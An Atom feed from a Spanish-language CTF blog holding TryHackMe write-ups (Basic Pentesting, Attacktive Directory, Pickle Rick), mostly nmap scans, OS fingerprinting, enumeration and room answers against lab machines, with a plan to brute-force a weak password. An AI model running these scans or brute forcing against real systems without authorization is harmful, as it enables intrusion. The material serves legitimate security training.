<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-14T15:54:46-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">tryhackme: Basic pentesting</title><link href="http://localhost:4000/basicPentesting/" rel="alternate" type="text/html" title="tryhackme: Basic pentesting" /><published>2021-12-03T00:00:00-05:00</published><updated>2021-12-03T00:00:00-05:00</updated><id>http://localhost:4000/basicPentesting</id><content type="html" xml:base="http://localhost:4000/basicPentesting/">&lt;p&gt;Comprovamos que la maquina este iniciada correctamente enviandole un ping&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.110.104
PING 10.10.110.104 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.110.104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.110.104: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;270 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.110.104 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 270.163/270.163/270.163/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como podemos ver, recibio el paquete enviado, ademas, mediante el ttl podemos saber que es una maquina &lt;em&gt;linux&lt;/em&gt; tambien podemos usar 
la utilidad wichSystem.py&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.110.103

10.10.110.103 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;Iniciamos el escaneo verificando los puertos abiertos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.110.103 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;blanco: 
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-08 08:12 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.110.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.47s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 52560 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 12970 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;149.01 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;con la utilidad extractPorts vemos un poco mejor los puertos abiertos y nos los copia en la clipboar&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.110.103
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80,139,445,8080
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
   8   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahora vemos un poco mejor los puertos abiertos, el siguiente proceso a seguir sera, ver posible vulnerabilidades y que serivicios
corren en dichos puertos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80,139,445,8080 10.10.110.103
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-08 09:28 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.110.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp   open  http        Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -3s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-12-08T09:28:42-05:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb2-time: 
|   date: 2021-12-08T14:28:42
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;vemos que existe una pagina web en el puerto 80&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/basic/web.png&quot; alt=&quot;web site&quot; /&gt;&lt;/p&gt;

&lt;p&gt;usando &lt;em&gt;gobuster&lt;/em&gt; encontramos un directorio y al verlo en el navegador encontramos lo siguiente:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/basic/development.png&quot; alt=&quot;development&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;al recisar el primer archivo encontramos la siguiente información, podria ser una pista para mas adelante, por si acaso,
la guardaremos&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/basic/dev.png&quot; alt=&quot;dev&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;en el segundo archivo, obtenemos un poco de información muy util&lt;/li&gt;
  &lt;li&gt;ya sabemos que la contraseña es debil, por tanto, usaremos un diccionario que trae parrot&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/basic/j.png&quot; alt=&quot;j&quot; /&gt;&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="brute forcing" /><category term="hash cracking" /><category term="service enumeration" /><category term="Linux Enumeration" /><summary type="html">Esta es una máquina que le permite practicar la piratería de aplicaciones web y la escalada de privilegios.</summary></entry><entry><title type="html">tryhackme: attacktive directory</title><link href="http://localhost:4000/attacktive-directory/" rel="alternate" type="text/html" title="tryhackme: attacktive directory" /><published>2021-11-30T00:00:00-05:00</published><updated>2021-11-30T00:00:00-05:00</updated><id>http://localhost:4000/attacktive-directory</id><content type="html" xml:base="http://localhost:4000/attacktive-directory/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.170.66
PING 10.10.170.66 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.170.66&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.170.66: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;157 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.170.66 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 157.244/157.244/157.244/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como podemos ver, recibio el paquete enviado, ademas, mediante el &lt;em&gt;ttl&lt;/em&gt; podemos saber que es una maquina  &lt;em&gt;windows&lt;/em&gt;
tambien podemos usar la utilidad &lt;em&gt;wichSystem.py&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.170.66

10.10.170.66 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 127&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;Iniciamos el escaneo verificando los puertos abiertos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.170.66 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;blanco: 
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-30 22:01 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.170.66
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.59s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 38185 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 27326 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49672/tcp open  unknown
49675/tcp open  unknown
49684/tcp open  unknown
49694/tcp open  unknown
49700/tcp open  unknown

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;274.35 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;con la utilidad &lt;em&gt;extractPorts&lt;/em&gt; vemos un poco mejor los puertos abiertos y nos los copia en la clipboard&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
   3   │ 
   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.170.66
   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49672,49675,49684,4
       │ 9694,49700
   6   │ 
   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
   8   │ 
───────┴─────────────────────────────────
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ahora pasamos a verificar que serivicios corren en cada puerto y posibles vulnerabilidades&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49672,49675,49684,49694,49700 10.10.170.66 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-30 22:12 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.170.66
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-12-01 03:12:58Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: spookysec.local0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: spookysec.local0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AttacktiveDirectory.spookysec.local
| Not valid before: 2021-11-30T02:52:27
|_Not valid after:  2022-06-01T02:52:27
|_ssl-date: 2021-12-01T03:14:01+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-2s&lt;/span&gt; from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-12-01T03:13:50+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: &lt;span class=&quot;nt&quot;&gt;-2s&lt;/span&gt;, deviation: 0s, median: &lt;span class=&quot;nt&quot;&gt;-2s&lt;/span&gt;
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-12-01T03:13:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;78.61 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;What tool will allow us to enumerate port 139/445?&lt;br /&gt;
enum4linux&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What is the NetBIOS-Domain Name of the machine?&lt;br /&gt;
THM-AD&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;What invalid TLD do people commonly use for their Active Directory Domain?&lt;br /&gt;
.local&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;enum4linux-es-una-herramienta-para-enumerara-información-de-sistemas-windows-y-samba&quot;&gt;Enum4linux es una herramienta para enumerara información de sistemas windows y Samba&lt;/h2&gt;

&lt;p&gt;la &lt;em&gt;flag&lt;/em&gt; -a Haga todas las enumeraciones simples (-U -S -G -P -r -o -n -i). 
Esta opción está habilitada si no proporciona ninguna otra opción.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="attacktive directory" /><category term="enum4linux" /><category term="kerbeos" /><summary type="html">El 99% de las redes corporativas funcionan con AD.</summary></entry><entry><title type="html">tryhackme: Pickle Rick</title><link href="http://localhost:4000/rick/" rel="alternate" type="text/html" title="tryhackme: Pickle Rick" /><published>2021-11-23T00:00:00-05:00</published><updated>2021-11-23T00:00:00-05:00</updated><id>http://localhost:4000/rick</id><content type="html" xml:base="http://localhost:4000/rick/">&lt;h2 id=&quot;iniciamos-esta-maquina&quot;&gt;Iniciamos esta maquina&lt;/h2&gt;

&lt;p&gt;Antes de iniciar verificamos que la maquina este activa mediante un &lt;em&gt;ping&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.103.222
PING 10.10.103.222 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.103.222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
64 bytes from 10.10.103.222: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;154 ms

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.103.222 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 153.727/153.727/153.727/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

